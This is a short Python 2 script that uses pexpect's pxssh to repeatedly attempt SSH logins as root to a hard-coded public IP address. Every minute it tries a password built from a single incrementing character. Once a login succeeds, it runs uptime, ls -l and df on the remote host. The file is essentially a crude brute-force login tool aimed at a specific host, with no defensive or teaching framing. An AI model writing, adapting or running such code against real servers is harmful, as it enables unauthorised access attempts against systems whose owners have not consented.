from datetime import datetime
from pexpect import pxssh
import getpass
import time, threading

class setInterval :
    def __init__(self,interval,action) :
        self.interval=interval
        self.action=action
        self.stopEvent=threading.Event()
        thread=threading.Thread(target=self.__setInterval)
        thread.start()

    def __setInterval(self) :
        nextTime=time.time()+self.interval
        while not self.stopEvent.wait(nextTime-time.time()) :
            nextTime+=self.interval
            self.action()

    def cancel(self) :
        self.stopEvent.set()

def ticks(dt):
	return (dt - datetime(1, 1, 1)).total_seconds() * 10000000

def tryssh():
	try:                    
		global indx
		global t1                                        
		s = pxssh.pxssh()
		hostname = "81.173.115.156" #raw_input('hostname: ')
		username = "root" #raw_input('username: ')
		print "indx: " + str(indx)
		print(indx, "=", chr(indx));
		password = (chr(indx)) #getpass.getpass('password: ') #chr(indx) #"1" #getpass("1") #getpass.getpass('password: ')
		print "password is: " + password
		indx = indx + 1
		s.login (hostname, username, password)
		s.sendline ('uptime')   # run a command
		s.prompt()             # match the prompt
		print s.before          # print everything before the prompt.
		s.sendline ('ls -l')
		s.prompt()
		print s.before
		s.sendline ('df')
		s.prompt()
		print s.before
		s.logout()
	except pxssh.ExceptionPxssh, e:
		global t1
		t2 = ticks(datetime.utcnow())
		print str(t2-t1)
		t1 = t2
		print "pxssh failed on login."
		print str(e)
		#tryssh()

t1 = ticks(datetime.utcnow())
indx = 1
StartTime=time.time()

tryssh()
inter=setInterval(60,tryssh)



